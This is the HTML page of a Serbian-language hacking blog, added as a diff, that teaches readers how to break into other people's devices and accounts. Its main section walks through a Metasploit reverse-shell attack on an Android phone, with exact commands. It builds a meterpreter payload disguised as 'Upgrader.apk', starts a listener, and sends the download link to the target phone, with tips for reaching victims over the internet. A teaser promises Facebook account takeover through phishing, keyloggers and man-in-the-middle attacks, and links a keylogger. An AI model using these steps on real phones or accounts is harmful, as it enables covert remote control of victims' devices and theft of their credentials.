@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-124070876-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-124070876-2');
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="description" content="Naucite kako hakovati uz Hakotron, sve  o hakovanju da bi mogli da se odbranite! Naucite kako hakovati sa kali linux!">
+    <link rel="icon" type="image/x-icon" href="img/naucite-kako-hakovati-min.PNG" />
+    <title>Hakotron</title>
+    <link rel="stylesheet" href="css/custom.min.css">
+</head>
+
+<body>
+
+    <div class="wrapper">
+        <header class="main-head">
+            <div>
+                <h1>Hakotron blog</h1>
+                <h3>Naucite kako hakovati!</h3>
+            </div>
+        </header>
+        <nav class="main-nav">
+            <ul>
+                <li>
+                    <span class="subheading">Precice:</span>
+                </li>
+                <li>
+                    <a href="facebook-hakovanje.html">Kako hakovati FaceBook (FejsBuk) nalog 5 razlicitih nacina!</a>
+                </li>
+                <li>
+                    <a href="#Kako-hakovati-android">Kako hakovati android mobilni telefon?</a>
+                </li>
+                <li>
+                    <a href="#Kako-instalirati-Kali">Kako instalirati Kali Linux u VirtualBox-u na Windows-u?</a>
+                </li>
+                <li>
+                    <a href="#Razlicite-vrste-hakera">Razlicite vrste hakera: White, Gray, Black Hat.</a>
+                </li>
+            </ul>
+        </nav>
+        <article class="content">
+            <h2>Kako hakovati FaceBook (FejsBuk) nalog 5 razlicitih nacina!</h2>
+            <p>Pomocu ovih 5 nacina naucicemo kako hakovati FaceBook (FejsBuk) naloge:</p>
+            <h3>PHISHING je i dalje najpopularniji nacin hakovanja FejsBuka (facebook). Postoje mnoge razlicite tehnike 
+            kako se ovaj napad izvodi. Ovde ce biti pokazana jedna vrsta phishing napada.</h3>
+            <h3>Naucicemo da hakujemo pomocu Keylogger-a. (program koji belezi sta god se ukuca na tastaturi)</h3>
+            <h3>Pomocu sacuvanih sifri u browser-u koje mozete da vratite pomocu ovog alata.</h3>
+            <h3>Pomocu mobilnog telefona od mete. (veci broj korisnika je hakovan preko mobilnog telefona)</h3>
+            <h3>Pomocu Man In the Middle napada. 
+            (ovo je napad gde se postavite izmedju mete i njegove internet konekcije)</h3>
+            <p>Svaki od ovih nacina je pojedinacno objasnjen na celom postu! Ovaj post je ovde 
+                da bi vi mogli da naucite kako da se odbranite od hakera. Nemojte mi slati mailove
+                za ilegalne  radnje zato sto ih ne podrzavam!</p>
+            <a href="facebook-hakovanje.html"><button class="btn-post" type="button"><svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <path d="M41.762 27.26v8.294c0 .571.305 1.1.8 1.385l20.212 11.669a1.6 1.6 0 0 1 0 2.771L42.562 63.048a1.6 1.6 0 0 0-.8 1.385v8.294a1.6 1.6 0 0 0 2.399 1.385l39.375-22.733a1.6 1.6 0 0 0 0-2.771L44.161 25.875a1.6 1.6 0 0 0-2.399 1.385z"></path>
+                <path d="M83.537 48.608L44.161 25.875a1.56 1.56 0 0 0-.597-.19l37.972 21.923a1.6 1.6 0 0 1 0 2.771L42.161 73.112c-.1.058-.205.092-.308.126.308.914 1.401 1.398 2.308.874l39.375-22.733a1.6 1.6 0 0 0 .001-2.771z"></path>
+                <path d="M41.762 27.26v8.294c0 .571.305 1.1.8 1.385l20.212 11.669a1.6 1.6 0 0 1 0 2.771L42.562 63.048a1.6 1.6 0 0 0-.8 1.385v8.294a1.6 1.6 0 0 0 2.399 1.385l39.375-22.733a1.6 1.6 0 0 0 0-2.771L44.161 25.875a1.6 1.6 0 0 0-2.399 1.385z"
+                    fill="none" stroke="#000" stroke-miterlimit="10"></path>
+                <path d="M14.664 27.273v8.294c0 .571.305 1.1.8 1.385l20.212 11.669a1.6 1.6 0 0 1 0 2.771L15.464 63.061a1.6 1.6 0 0 0-.8 1.385v8.294a1.6 1.6 0 0 0 2.399 1.385l39.375-22.733a1.6 1.6 0 0 0 0-2.771L17.063 25.888a1.6 1.6 0 0 0-2.399 1.385z"></path>
+                <path d="M56.438 48.621L17.063 25.888a1.56 1.56 0 0 0-.597-.19l37.972 21.923a1.6 1.6 0 0 1 0 2.771L15.063 73.125c-.1.058-.205.092-.308.126.308.914 1.401 1.398 2.308.874l39.375-22.733a1.6 1.6 0 0 0 0-2.771z"></path>
+                <path d="M14.664 27.273v8.294c0 .571.305 1.1.8 1.385l20.212 11.669a1.6 1.6 0 0 1 0 2.771L15.464 63.061a1.6 1.6 0 0 0-.8 1.385v8.294a1.6 1.6 0 0 0 2.399 1.385l39.375-22.733a1.6 1.6 0 0 0 0-2.771L17.063 25.888a1.6 1.6 0 0 0-2.399 1.385z"
+                    fill="none" stroke="#000" stroke-miterlimit="10"></path>
+            </svg>
+            ZA CEO POST KLIKNI OVDE!</button></a>
+            <hr>
+            <h2><a name="Kako-hakovati-android"></a>Kako hakovati android mobilni telefon?</h2>
+            <p>Ako niste procitali <a href="#Kako-instalirati-Kali">Kako instalirati Kali Linux u VirtualBox-u na
+                Windows-u?</a> onda to mozete uraditi sada ako hocete da nastavite.</p>
+            <p>Prvo sto treba da uradite jeste da otvorite terminal i napravite .apk aplikaciju to cemo uraditi tako
+                sto ukucamo u terminalu
+                ovu komandu: "<b>msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk</b>"
+                zamenite LHOST sa vasom
+                ip adresom. (mozete ovo uraditi preko WAN tako sto uneste externu IP adresu ali morate da portforward,
+                za vise pitanja u vezi portforward
+                mozete da mi posaljete mail i pomocicu vam cim budem mogao.)</p>
+            <img class="b-lazy" src="img/msfpayload-kali-terminal-min1.PNG" data-src="img/msfpayload-kali-terminal-min.PNG"
+                alt="metasploit komanda za pravljenje novog payload-a">
+            <p>Sledeci korak je da otvorite jos jedan terminal i pokrenete metasploit u njemu tako sto cete ukucati: <b>msfconsole</b></p>
+            <img class="b-lazy" src="img/msfconsole-kali-terminal-min1.PNG" data-src="img/msfconsole-kali-terminal-min.PNG"
+                alt="metasploit pokretanje msfconsole">
+            <p>Morate pokrenuti listener u konsoli tako sto uneste sledece: <b>use exploit/multi/handler</b></p>
+            <img class="b-lazy" src="img/msflistener-kali-terminal-min1.PNG" data-src="img/msflistener-kali-terminal-min.PNG"
+                alt="metasploit listener pokretanje">
+            <p>Sledece sto morate da uneste da bi napravili listener: "<b>set payload android/meterpreter/reverse_tcp</b>",
+                izabrali ste payload sledece sto morate da uneste jeste vas LHOST: "<b>set LHOST 192.168.0.4</b>"
+                (mozete uneti vasu lokalnu ip adresu iako radite ovo preko WAN-a)</p>
+            <img class="b-lazy" src="img/msflistener-setup-kali-terminal-min1.PNG" data-src="img/msflistener-setup-kali-terminal-min.PNG"
+                alt="metasploit listener podesavanje">
+            <p>Kada ste uneli sve neophodne podatke ukucajte: "<b>exploit</b>" da pokrenete listener.
+                Sledece sto trebate da uradite jeste da prebacite aplikaciju koju ste napravili na mobilni telefon
+                tako sto cete je upload-ovati iz vaseg root folder-a na neki sharing website npr: dropbox ili
+                tinyupload</p>
+            <img class="b-lazy" src="img/kali-andorid-payload-apk-min1.PNG" data-src="img/kali-andorid-payload-apk-min.PNG"
+                alt="android payload apk">
+            <p>Onda posaljite link koji ste dobili na mobilni koji hocete da hackujete (ovo ce raditi samo u lokalnoj
+                mrezi
+                osim ako ste koristi WAN metodu u kom slucaju ce raditi bilo gde)</p>
+            <img class="b-lazy" src="img/tiny-upload-chose-file-min1.PNG" data-src="img/tiny-upload-chose-file-min.PNG"
+                alt="tinyupload izaberite fajl za upload">
+            <img class="b-lazy" src="img/tiny-upload-download-file-min1.PNG" data-src="img/tiny-upload-download-file-min.PNG"
+                alt="tinyupload fajl upload gotov">
+            <p>Otvorite link koji ste poslali i skinite aplikaciju pa je otvorite i instalirajte (morate odobriti
+                opciju za
+                instalacije aplikacija od nepoznatih izvora pre toga ako vec nije odobrena) posle ovoga bi trebalo da
+                dobijete
+                otvorenu konekciju u drugom terminalu u kom ste podesili i pokrenuli listener.</p>
+            <img class="b-lazy" src="img/msfsession-started-kali-terminal-min1.PNG" data-src="img/msfsession-started-kali-terminal-min.PNG"
+                alt="metasploit nova konekcija uspostavljena">
+            <p>Etoga uspesno ste hackovali android mobilni telefon. Posle cega mozete da koriste postmodule za dalje
+                hackovanje.
+                Za jos tutorijala posetite blog ponovo!</p>
+            <hr>
+            <h2><a name="Kako-instalirati-Kali"></a>Kako instalirati Kali Linux u VirtualBox-u na Windows-u?</h2>
+            <p>Stvari koje su vam potrebne:
+                <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox</a> i
+                <a href="https://www.kali.org/downloads/">Kali Linux instalacija za virtualbox.</a>
+            </p>
+            <p>Morate skinuti VBox verziju Kali operativnog sistema
+                <a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/">(Kali
+                    Linux 64 bit Vbox ili Kali Linux 32 bit Vbox)</a>
+            </p>
+            <p>Jedna od prednosti je kada instalirate Kali Linux u VirtualBox-u jeste to sto ako volite da installirate
+                stvari
+                od nepoznatih izvora ili da menjate kod sistema mozete obrisati i ponovo podici ceo sistem za manje od
+                5minuta
+                bez ikakvih promena vasem primarnom operativnom sistemu. </p>
+            <p>Jedna od mana je to sto gubite na brzini vaseg racunara.</p>
+            <img class="b-lazy" src="img/kali-vbox-main-min1.jpg" data-src="img/kali-vbox-main-min.jpg" alt="Kali and VBOX" />
+            <p>Ako vam je potrebna pomoc pri instaliranju Virtualbox-a mozete otici na njihov sajt i procitati
+                <a href="https://www.virtualbox.org/manual/UserManual.html">usermanual</a>
+            </p>
+            <p>Kada ste skinuli sve i instalirali VirtualBox mozete ga pokrenuti pa onda klikom na "file" pa na "Import
+                Appliance"</p>
+            <img class="b-lazy" src="img/vbox-import-min1.PNG" data-src="img/vbox-import-min.PNG" alt="Vbox import">
+            <p>Onda kliknete na ikonu folder-a i izaberete Kali Vbox .ova file koji ste skinuli </p>
+            <img class="b-lazy" src="img/vbox-import2-min1.PNG" data-src="img/vbox-import2-min.PNG" alt="Vbox importing2">
+            <p>Zatim kliknete na "Import" i sacekate par minuta</p>
+            <img class="b-lazy" src="img/vbox-import3-min1.PNG" data-src="img/vbox-import3-min.PNG" alt="Vbox importing3">
+            <p>Posle toga mozete pokrenuti virtualnu masinu koju ste napravili klikom na start</p>
+            <img class="b-lazy" src="img/vbox-start-kali-min1.PNG" data-src="img/vbox-start-kali-min.PNG" alt="Vbox starting kali">
+            <img class="b-lazy" src="img/vbox-running-kali-min1.PNG" data-src="img/vbox-running-kali-min.PNG" alt="Vbox running kali">
+            <p>Kada vas pita za login detalje unesite: username: "<b>root</b>" i password: "<b>toor</b>" i kliknite na
+                signin</p>
+            <img class="b-lazy" src="img/kali-login-min1.PNG" data-src="img/kali-login-min.PNG" alt="Kali login">
+            <img class="b-lazy" src="img/kali-login-pass-min1.PNG" data-src="img/kali-login-pass-min.PNG" alt="Kali login and pass">
+            <p>posle toga bi trebalo da vidite kali homescreen koji izgleda ovako</p>
+            <img class="b-lazy" src="img/kali-homescreen-min1.PNG" data-src="img/kali-homescreen-min.PNG" alt="Kali homescreen">
+            <p>Cestitam uspesno ste instalirali i pokrenuli Kali Linux opertaivni sistem u VirutalBox-u na Windows-u,
+                sada ste spremni da pratite svaki od sledecih tutorijala koji ce izlaziti stalno na ovom blogu!</p>
+            <hr>
+            <h2> <a name="Razlicite-vrste-hakera"></a>Razlicite vrste hakera: White, Gray i Black Hat.</h2>
+            <p>Black Hat hakeri su hakeri o kojima ste vec culi u novinama mozda cak i na televiziji. Black Hat
+                hakeri obicno krse zakone i ilegalno hakuju kompjutere (sisteme) za sopstvenu dobit ili jednostavno da
+                bi
+                nekome naneli stetu. (Npr. kradja kreditnih kartica, prikupljanje licnih informacija za prodaju,
+                DDOS napadi...
+                )</p>
+            <p>White Hat hakeri su totalna suprotnost Black Hat hakerima oni su hakeri koje unajmite
+                kada hocete da vidite dal vas je moguce hakovati i kako da se osigurate od hakera. (uvek rade legalne
+                stavri)
+                Naravno oni kao i White Hat hakeri su experti za hakovanje kompjutera. Oni hakuju kompjutere (sisteme)
+                za dobre
+                i legalne svrhe kako bi pomogli ljudima.</p>
+            <p>Gray Hat hakeri spadaju u blend od Black Hat i White Hat hakera. Oni su obicno hakeri koji bez dozvole
+                hakuju
+                kompjutere (sisteme) i onda pokazu kako su to uradili, kako bi ga ojacali i spreceli da se to ponovi.
+                (ovo je i dalje ilegalno)</p>
+            <img class="b-lazy" src="img/hats-min1.png" data-src="img/hats-min.png" alt="white gray black hat">
+            <hr>
+        </article>
+        <aside class="side">
+            <ul>
+                <li>
+                    <span class="subheading">Potrebni linkovi:</span>
+                </li>
+                <li>
+                    <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox downloads</a>
+                </li>
+                <li>
+                    <a href="https://www.kali.org/downloads/">Kali downloads</a>
+                </li>
+                <li>
+                    <a href="https://github.com/rapid7/metasploit-framework">Metasploit</a>
+                </li>
+                <li>
+                    <a href="https://www.logixoft.com/en-us/index">Revealer Keylogger logixoft</a>
+                </li>
+                <li>
+                    <a href="https://www118.zippyshare.com/v/hIGQno3F/file.html">Cube Recovery</a>
+                </li>
+            </ul>
+        </aside>
+        <div class="ad">Advertising</div>
+        <footer class="main-footer">
+            <p>Bilo kava pitanja? Kontaktirajte me ovde!
+                <a href="mailto:necony286&#64;gmail&#46;com">necony286&#64;gmail&#46;com</a>
+            </p>
+        </footer>
+    </div>
+    <script>
+        var script = document.createElement("script");
+        script.addEventListener("load", function(event) {
+            var bLazy = new Blazy({
+                selector: 'img',
+            });
+        });
+        script.src = "js/lazy.min.js";
+        script.async = true;
+        document.getElementsByTagName("script")[0].parentNode.appendChild(script);
+    </script>
+    <script type="application/ld+json">
+        [{
+            "@context": "http://schema.org",
+            "@type": "Article",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "http://blog.necony286.com"
+            },
+            "name": "Kako hakovati android mobilni telefon?",
+            "headline": "Kako hakovati android mobilni",
+            "author": {
+                "@type": "Person",
+                "name": "necony286"
+            },
+            "image": ["http://blog.necony286.com/img/msfpayload-kali-terminal-min.PNG",
+                "http://blog.necony286.com/img/msfconsole-kali-terminal-min.PNG"
+            ],
+            "genre": "Kako hakovati",
+            "datePublished": "2018-09-5",
+            "dateCreated": "2018-09-5",
+            "dateModified": "2018-09-10",
+            "description": "Nacuite kako da hakujete android mobilni telefon",
+            "articleBody": "Prvo sto treba da uradite jeste da otvorite terminal i napravite .apk aplikaciju to cemo uraditi tako sto ukucamo u terminalu ovu komandu: msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk zamenite LHOST sa vasom ip adresom. (mozete ovo uraditi preko WAN tako sto uneste externu IP adresu ali morate da portforward, za vise pitanja u vezi portforward mozete da mi posaljete mail i pomocicu vam cim budem mogao.) Sledeci korak je da otvorite jos jedan terminal i pokrenete metasploit u njemu tako sto cete ukucati: msfconsole Sledece sto morate da uneste da bi napravili listener: set payload android meterpreter reverse_tcp, izabrali ste payload sledece sto morate da uneste jeste vas LHOST: set LHOST 192.168.0.4 (mozete uneti vasu lokalnu ip adresu iako radite ovo preko WAN-a) Kada ste uneli sve neophodne podatke ukucajte: exploit da pokrenete listener. Sledece sto trebate da uradite jeste da prebacite aplikaciju koju ste napravili na mobilni telefon tako sto cete je upload-ovati iz vaseg root folder-a na neki sharing website npr: dropbox ili tinyupload Otvorite link koji ste poslali i skinite aplikaciju pa je otvorite i instalirajte (morate odobriti opciju za instalacije aplikacija od nepoznatih izvora pre toga ako vec nije odobrena) posle ovoga bi trebalo da dobijete otvorenu konekciju u drugom terminalu u kom ste podesili i pokrenuli listener. Etoga uspesno ste hackovali android mobilni telefon. Posle cega mozete da koriste postmodule za dalje hackovanje. Za jos tutorijala posetite blog ponovo!",
+            "publisher": {
+                "@type": "Organization",
+                "name": "Necony286",
+                "logo": {
+                    "@type": "ImageObject",
+                    "url": "http://blog.necony286.com/img/naucite-kako-hakovati-min.PNG",
+                    "width": 600,
+                    "height": 60
+                }
+            }
+        }, {
+            "@context": "http://schema.org",
+            "@type": "Article",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "http://blog.necony286.com"
+            },
+            "name": "Kako instalirati Kali Linux u VirtualBox-u na Windows-u?",
+            "headline": "Kako instalirati Kali Linux u VirtualBox-u",
+            "author": {
+                "@type": "Person",
+                "name": "necony286"
+            },
+            "image": ["http://blog.necony286.com/img/kali-vbox-main-min.jpg"],
+            "genre": "Kako hakovati",
+            "datePublished": "2018-09-5",
+            "dateCreated": "2018-09-5",
+            "dateModified": "2018-09-5",
+            "description": "Nacuite kako da instalirate Kali linux operativni sistem u VirtualBox-u",
+            "articleBody": "Stvari koje su vam potrebne: VirtualBox i Kali Linux instalacija za virtualbox. Morate skinuti VBox verziju Kali operativnog sistema (Kali Linux 64 bit Vbox ili Kali Linux 32 bit Vbox) Jedna od prednosti je kada instalirate Kali Linux u VirtualBox-u jeste to sto ako volite da installirate stvari od nepoznatih izvora ili da menjate kod sistema mozete obrisati i ponovo podici ceo sistem za manje od 5minuta bez ikakvih promena vasem primarnom operativnom sistemu. Jedna od mana je to sto gubite na brzini vaseg racunara. Ako vam je potrebna pomoc pri instaliranju Virtualbox-a mozete otici na njihov sajt i procitati usermanual Kada ste skinuli sve i instalirali VirtualBox mozete ga pokrenuti pa onda klikom na file pa na Import Appliance Onda kliknete na ikonu folder-a i izaberete Kali Vbox .ova file koji ste skinuli Zatim kliknete na Import i sacekate par minuta  Posle toga mozete pokrenuti virtualnu masinu koju ste napravili klikom na start Kada vas pita za login detalje unesite: username: root i password: toor i kliknite na signin  posle toga bi trebalo da vidite kali homescreen koji izgleda ovako Cestitam uspesno ste instalirali i pokrenuli Kali Linux opertaivni sistem u VirutalBox-u na Windows-u, sada ste spremni da pratite svaki od sledecih tutorijala koji ce izlaziti stalno na ovom blogu!",
+            "publisher": {
+                "@type": "Organization",
+                "name": "Necony286",
+                "logo": {
+                    "@type": "ImageObject",
+                    "url": "http://blog.necony286.com/img/naucite-kako-hakovati-min.PNG",
+                    "width": 600,
+                    "height": 60
+                }
+            }
+        }, {
+            "@context": "http://schema.org",
+            "@type": "Article",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "http://blog.necony286.com"
+            },
+            "name": "Razlicite vrste hakera: White, Gray i Black Hat.",
+            "headline": "Razlicite vrste hakera",
+            "author": {
+                "@type": "Person",
+                "name": "necony286"
+            },
+            "image": ["http://blog.necony286.com/img/hats-min.png"],
+            "genre": "Kako hakovati",
+            "datePublished": "2018-09-5",
+            "dateCreated": "2018-09-5",
+            "dateModified": "2018-09-5",
+            "description": "Nacuite razliku izmedju razlicitih vrsta hakera",
+            "articleBody": "Black Hat hakeri su hakeri o kojima ste vec culi u novinama mozda cak i na televiziji. Black Hat hakeri obicno krse zakone i ilegalno hakuju kompjutere (sisteme) za sopstvenu dobit ili jednostavno da bi nekome naneli stetu. (Npr. kradja kreditnih kartica, prikupljanje licnih informacija za prodaju, DDOS napadi... ) White Hat hakeri su totalna suprotnost Black Hat hakerima oni su hakeri koje unajmite kada hocete da vidite dal vas je moguce hakovati i kako da se osigurate od hakera. (uvek rade legalne stavri) Naravno oni kao i White Hat hakeri su experti za hakovanje kompjutera. Oni hakuju kompjutere (sisteme) za dobre i legalne svrhe kako bi pomogli ljudima. Gray Hat hakeri spadaju u blend od Black Hat i White Hat hakera. Oni su obicno hakeri koji bez dozvole hakuju kompjutere (sisteme) i onda pokazu kako su to uradili, kako bi ga ojacali i spreceli da se to ponovi. (ovo je i dalje ilegalno)",
+            "publisher": {
+                "@type": "Organization",
+                "name": "Necony286",
+                "logo": {
+                    "@type": "ImageObject",
+                    "url": "http://blog.necony286.com/img/naucite-kako-hakovati-min.PNG",
+                    "width": 600,
+                    "height": 60
+                }
+            }
+        },{
+            "@context": "http://schema.org",
+            "@type": "Article",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "http://blog.necony286.com"
+            },
+            "name": "Kako hakovati FaceBook (FejsBuk) nalog 5 razlicitih nacina!",
+            "headline": "kako hakovati FaceBook (FejsBuk) nalog",
+            "author": {
+                "@type": "Person",
+                "name": "necony286"
+            },
+            "image": ["http://blog.necony286.com/img/setoolkit-GOT-THE-ACC-zoom-min.PNG","http://blog.necony286.com/img/Cube-Got-the-account-and-all-CLOOSEUP-min.PNG"],
+            "genre": "Kako hakovati",
+            "datePublished": "2018-09-9",
+            "dateCreated": "2018-09-9",
+            "dateModified": "2018-09-9",
+            "description": "Pomocu ovih nacina naucicemo kako hakovati FaceBook (FejsBuk) naloge",
+            "articleBody": "PHISHING je i dalje najpopularniji nacin hakovanja FejsBuka (facebook). Postoje mnoge razlicite tehnike kako se ovaj napad izvodi. Ovde ce biti pokazana jedna vrsta phishing napada. Pomocu Keylogger-a. (program koji belezi sta god se ukuca na tastaturi) Pomocu mobilnog telefona od mete. (veci broj korisnika je hakovan preko mobilnog telefona) Pomocu Man In the Middle napada. (ovo je napad gde se postavite izmedju mete i njegove internet konekcije)",
+            "publisher": {
+                "@type": "Organization",
+                "name": "Necony286",
+                "logo": {
+                    "@type": "ImageObject",
+                    "url": "http://blog.necony286.com/img/naucite-kako-hakovati-min.PNG",
+                    "width": 600,
+                    "height": 60
+                }
+            }
+        }]
+    </script>
+</body>
+
+</html>
